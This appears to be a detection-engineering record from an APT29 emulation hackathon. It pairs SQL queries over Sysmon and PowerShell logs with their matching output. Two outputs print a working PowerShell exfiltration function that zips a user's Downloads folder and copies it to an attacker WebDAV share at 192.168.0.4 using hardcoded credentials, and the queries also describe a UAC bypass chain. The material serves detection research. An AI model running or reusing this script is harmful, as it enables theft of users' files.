vendor: OTR Community
step: 7.B.4
procedure: Exfiltrated collection (OfficeSupplies.7z) to WebDAV network share using PowerShell
criteria: powershell executing Copy-Item pointing to an attack-controlled WebDav network share (192.168.0.4:80)
technique:
  name: Exfiltration Over Alternative Protocol
  id: T1048
issue: https://github.com/OTRF/detection-hackathon-apt29/issues/17
detections:
  - main_type: Telemetry
    modifier_type: Correlated
    description: Telemetry showed PoweShell Copy-Item to a remote adversary WebDav network share (192.168.0.4). The event was correlated to a parent alert for Bypass User Account Control of control.exe spawning powershell.exe.
    reference:
    queries:
      - id: 7AAC6658-2B5C-4B4A-B7C9-D42D288D5218
        data_sources:
          - event_provider: Microsoft-Windows-Sysmon/Operational
            event_logs:
              - 1
          - event_provider: Microsoft-Windows-PowerShell/Operational
            event_logs:
              - 4104
        rule_contribution:
        logic: |
          SELECT f.ScriptBlockText
          FROM apt29Host f
          INNER JOIN (
              SELECT d.ProcessId, d.ParentProcessId
              FROM apt29Host d
              INNER JOIN (
                SELECT a.ProcessGuid, a.ParentProcessGuid
                FROM apt29Host a
                INNER JOIN (
                  SELECT ProcessGuid
                  FROM apt29Host
                  WHERE Channel = "Microsoft-Windows-Sysmon/Operational"
                      AND EventID = 1
                      AND LOWER(Image) LIKE "%control.exe"
                      AND LOWER(ParentImage) LIKE "%sdclt.exe"
                ) b
                ON a.ParentProcessGuid = b.ProcessGuid
                WHERE a.Channel = "Microsoft-Windows-Sysmon/Operational"
                  AND a.EventID = 1
                  AND a.IntegrityLevel = "High"
              ) c
              ON d.ParentProcessGuid= c.ProcessGuid
              WHERE d.Channel = "Microsoft-Windows-Sysmon/Operational"
                AND d.EventID = 1
                AND d.Image LIKE '%powershell.exe'
          ) e
          ON f.ExecutionProcessID = e.ProcessId
          WHERE f.Channel = "Microsoft-Windows-PowerShell/Operational"
            AND f.EventID = 4104
            AND LOWER(f.ScriptBlockText) LIKE "%copy-item%"
        output: |
          function Invoke-Exfil {

            if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershell -Force }
        
            Write-Host "[*] Compressing all the things in download dir"
            Compress-7Zip -Path "$env:USERPROFILE\Downloads\" -Filter * -Password "lolol" -ArchiveFileName "$env:APPDATA\OfficeSupplies.7z"
        
            $UserName = "cozy"
            $Password = "MyCozyPassw0rd!" | ConvertTo-SecureString -AsPlainText -Force
            $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password
        
            $WebDavShare = "WebDavShare"
            $uri = "\\192.168.0.4\webdav"
        
            Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
            
            Write-Host "[*] Creating a temporary mapped network drive - WebDavShare"
            New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds
        
            Write-Host "[*] Copying data to WebDavShare"
            Copy-Item "$env:APPDATA\OfficeSupplies.7z" "WebDavShare:\OfficeSupplies.7z" -Force
        
            Write-Host "[*] Removing temporary network share"
            Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue
        
            Invoke-BeachCleanup
          }
      - id: B19F8E16-AA6C-45C1-8A0D-92812830C237
        data_sources:
          - event_provider: Security
            event_logs:
              - 4688
          - event_provider: Microsoft-Windows-PowerShell/Operational
            event_logs:
              - 4104
        rule_contribution:
        logic: |
          SELECT f.ScriptBlockText
          FROM apt29Host f
          INNER JOIN (
            SELECT split(d.NewProcessId, '0x')[1] as NewProcessId
            FROM apt29Host d
            INNER JOIN(
              SELECT a.ProcessId, a.NewProcessId
              FROM apt29Host a
              INNER JOIN (
                SELECT NewProcessId
                FROM apt29Host
                WHERE LOWER(Channel) = "security"
                    AND EventID = 4688
                    AND LOWER(NewProcessName) LIKE "%control.exe"
                    AND LOWER(ParentProcessName) LIKE "%sdclt.exe"
              ) b
              ON a.ProcessId = b.NewProcessId
              WHERE LOWER(a.Channel) = "security"
                AND a.EventID = 4688
                AND a.MandatoryLabel = "S-1-16-12288"
                AND a.TokenElevationType = "%%1937"
            ) c
            ON d.ProcessId = c.NewProcessId
            WHERE LOWER(d.Channel) = "security"
              AND d.EventID = 4688
              AND d.NewProcessName LIKE '%powershell.exe'
          ) e
          ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId
          WHERE f.Channel = "Microsoft-Windows-PowerShell/Operational"
          AND f.EventID = 4104
          AND LOWER(f.ScriptBlockText) LIKE "%copy-item%"
        output: |
          function Invoke-Exfil {

            if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershell -Force }
        
            Write-Host "[*] Compressing all the things in download dir"
            Compress-7Zip -Path "$env:USERPROFILE\Downloads\" -Filter * -Password "lolol" -ArchiveFileName "$env:APPDATA\OfficeSupplies.7z"
        
            $UserName = "cozy"
            $Password = "MyCozyPassw0rd!" | ConvertTo-SecureString -AsPlainText -Force
            $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password
        
            $WebDavShare = "WebDavShare"
            $uri = "\\192.168.0.4\webdav"
        
            Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
            
            Write-Host "[*] Creating a temporary mapped network drive - WebDavShare"
            New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds
        
            Write-Host "[*] Copying data to WebDavShare"
            Copy-Item "$env:APPDATA\OfficeSupplies.7z" "WebDavShare:\OfficeSupplies.7z" -Force
        
            Write-Host "[*] Removing temporary network share"
            Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue
        
            Invoke-BeachCleanup
          }
  - main_type: technique
    modifier_type: Alert
    description: A technique alert can be created for svchost.exe spawning rundll32.exe with command arguments like C:\windows\system32\davclnt.dll,DavSetCookie. This is context around the webclient used for the webdav activity.
    reference:
    queries:
      - id: C10730EA-6345-4934-AA0F-B0EFCA0C4BA6
        data_sources:
          - event_provider: Microsoft-Windows-Sysmon/Operational
            event_logs:
              - 1
        rule_contribution:
        logic: |
          SELECT Message
          FROM apt29Host
          WHERE Channel = "Microsoft-Windows-Sysmon/Operational"
              AND EventID = 1
              AND CommandLine RLIKE '.*rundll32.exe.*\\\\\\\\windows\\\\\\\\system32\\\\\\\\davclnt.dll.*DavSetCookie.*'
        output: |
          Process Create:
          RuleName: -
          UtcTime: 2020-05-02 03:08:50.846
          ProcessGuid: {47ab858c-e442-5eac-ec03-000000000400}
          ProcessId: 3268
          Image: C:\Windows\System32\rundll32.exe
          FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
          Description: Windows host process (Rundll32)
          Product: Microsoft® Windows® Operating System
          Company: Microsoft Corporation
          OriginalFileName: RUNDLL32.EXE
          CommandLine: rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
          CurrentDirectory: C:\windows\system32\
          User: DMEVALS\pbeesly
          LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
          LogonId: 0x372E81
          TerminalSessionId: 2
          IntegrityLevel: High
          Hashes: SHA1=7662A8D2F23C3474DEC6EF8E2B0365B0B86714EE,MD5=F68AF942FD7CCC0E7BAB1A2335D2AD26,SHA256=11064E9EDC605BD5B0C0A505538A0D5FD7DE53883AF342F091687CAE8628ACD0,IMPHASH=F27A7FC3A53E74F45BE370131953896A
          ParentProcessGuid: {47ab858c-e43f-5eac-eb03-000000000400}
          ParentProcessId: 8984
          ParentImage: C:\Windows\System32\svchost.exe
          ParentCommandLine: C:\windows\system32\svchost.exe -k LocalService -p -s WebClient
